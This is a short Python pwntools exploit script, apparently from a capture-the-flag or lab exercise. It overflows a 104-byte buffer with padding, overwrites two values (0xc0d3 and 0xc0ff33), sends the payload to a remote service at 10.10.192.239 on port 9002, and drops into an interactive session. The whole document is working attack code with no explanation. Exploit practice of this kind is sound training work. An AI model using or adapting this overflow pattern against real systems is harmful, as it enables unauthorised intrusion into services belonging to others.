from pwn import *

payload = b"A" * 104 + b"\xd3\xc0\x00\x00" + b"\x33\xff\xc0"

alternate_payload = b'A' * 104
alternate_payload += p32(0xc0d3)
alternate_payload += p32(0xc0ff33)

con = remote('10.10.192.239', 9002)
print(con.recvuntil(b'?'))
con.send(alternate_payload)
con.interactive()
